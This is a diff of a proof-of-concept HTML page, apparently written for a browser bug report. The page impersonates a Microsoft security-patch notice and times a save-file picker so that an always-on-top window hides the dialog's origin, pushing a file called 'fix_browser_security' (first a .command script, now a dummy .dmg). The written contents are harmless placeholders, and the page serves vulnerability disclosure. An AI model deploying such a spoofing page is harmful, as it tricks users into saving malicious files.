@@ -1,3 +1,8 @@
+
+poc_save_file_hijack.html
+
+
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -58,7 +63,6 @@
     </style>
 </head>
 <body>
-
 <div class="container">
     <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft" class="logo">
     <h1>Action Required: Security Patch</h1>
@@ -67,14 +71,11 @@
     <a id="save-trigger" class="btn" href="https://support.microsoft.com">
         Apply Critical Patch
     </a>
-
     <div id="log"></div>
 </div>
-
 <script>
     const trigger = document.getElementById('save-trigger');
     const log = document.getElementById('log');
-
     trigger.addEventListener('contextmenu', () => {
         console.log("[PoC] Right-click detected. Waiting for Mini Window to open...");
         
@@ -83,25 +84,23 @@
         // The Mini Window (always-on-top) will cover the native dialog's origin info
         setTimeout(async () => {
             try {
-                // We suggest a malicious-looking filename
+                // We suggest a malicious-looking filename in DMG format
                 const handle = await window.showSaveFilePicker({
-                    suggestedName: 'fix_browser_security.command',
+                    suggestedName: 'fix_browser_security.dmg',
                     types: [{
-                        description: 'System Command',
-                        accept: {'text/plain': ['.command', '.sh']}
+                        description: 'macOS Disk Image',
+                        accept: {'application/x-apple-diskimage': ['.dmg']}
                     }],
                 });
-
-                // If user selects and clicks save, we write malicious content
+                // If user selects and clicks save, we write dummy DMG content
                 const writable = await handle.createWritable();
-                await writable.write("#!/bin/bash\necho 'EXPLOTED: Malicious script executed!'\nosascript -e 'display dialog \"Vulnerability PoC: Your system has been compromised by a spoofed Save Dialog.\" buttons {\"OK\"} default button \"OK\"'\n");
+                await writable.write("DUMMY DMG PAYLOAD CONTENT");
                 await writable.close();
-
                 log.style.display = 'block';
                 log.innerHTML = `
                     <b>⚠️ SAVE DIALOG HIJACKED</b><br><br>
-                    File saved successfully: <b>fix_browser_security.command</b><br>
-                    <b>Impact:</b> The user was tricked into saving a malicious executable script. 
+                    File saved successfully: <b>fix_browser_security.dmg</b><br>
+                    <b>Impact:</b> The user was tricked into saving a malicious MacOS Disk Image (.dmg). 
                     The Mini Window covered the "Origin" information in the native Save dialog, 
                     making it look like a trusted system action from Microsoft Support.
                 `;
@@ -112,6 +111,5 @@
         }, 3500);
     });
 </script>
-
 </body>
 </html>
